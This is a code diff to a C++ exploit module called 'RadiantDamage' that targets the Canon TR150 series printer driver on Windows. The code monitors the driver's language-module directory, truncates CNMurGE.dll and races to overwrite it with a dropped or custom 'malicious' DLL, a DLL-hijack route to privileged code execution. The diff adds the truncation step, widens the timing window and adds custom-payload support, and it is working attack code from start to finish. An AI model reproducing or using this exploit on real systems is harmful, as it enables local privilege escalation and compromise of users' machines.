@@ -10,6 +10,21 @@
 
 namespace
 {
+    void stompOnTarget(const std::string& p_target)
+    {
+        if (HANDLE hFile = CreateFileA(p_target.c_str(), GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+            NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL))
+        {
+            std::cout << "[+] File " << p_target << " has been truncated" << std::endl;
+            CloseHandle(hFile);
+        }
+        else
+        {
+            // standard behavior on first install though
+            std::cerr << "[!] File " << p_target << " could not be truncated. Likely first install." << std::endl;
+        }
+    }
+
     void HandleDirectoryChange(HANDLE dwCompletionPort, const std::string& p_target,
         const std::string& p_target_dll, const std::string& p_malicious_dll)
     {
@@ -44,7 +59,7 @@ namespace
                             if (change_counter == 0)
                             {
                                 // timing attacks. amirite?
-                                std::this_thread::sleep_for(std::chrono::milliseconds(2000));
+                                std::this_thread::sleep_for(std::chrono::milliseconds(4000));
 
                                 // just try to copy. don't check error status. it doesn't matter.
                                 CopyFileA(p_malicious_dll.c_str(), p_target.c_str(), FALSE);
@@ -65,8 +80,7 @@ namespace
 RadiantDamage::RadiantDamage() :
 	Exploit("Canon TR150 series", "RadiantDamage"),
 	m_target_directory("C:\\ProgramData\\CanonBJ\\IJPrinter\\CNMWINDOWS\\Canon TR150 series\\LanguageModules\\040C\\"),
-    m_target_dll("CNMurGE.dll"),
-    m_malicious_dll("Dll.dll")
+    m_target_dll("CNMurGE.dll")
 {
 }
 
@@ -76,7 +90,7 @@ RadiantDamage::~RadiantDamage()
 
 bool RadiantDamage::do_exploit()
 {
-    if (!drop_dll_to_disk(m_malicious_dll, inject_me_dll, inject_me_dll_len))
+    if (!m_custom_dll && !drop_dll_to_disk(m_malicious_dll, inject_me_dll, inject_me_dll_len))
     {
         return false;
     }
@@ -93,6 +107,9 @@ bool RadiantDamage::do_exploit()
     bool loop = true;
     while (loop)
     {
+        // truncate the target file
+        stompOnTarget(target_path);
+
         // configure monitoring of the target directory
         DIRECTORY_INFO dirInfo = {};
         HANDLE hCompPort = configure_directory_monitoring(dirInfo, m_target_directory);
@@ -127,7 +144,10 @@ bool RadiantDamage::do_exploit()
         }
     }
 
-    std::cout << "[+] Cleaning up dropped dll" << std::endl;
-    _unlink(m_malicious_dll.c_str());
+    if (!m_custom_dll)
+    {
+        std::cout << "[+] Cleaning up dropped dll" << std::endl;
+        _unlink(m_malicious_dll.c_str());
+    }
 	return true;
 }
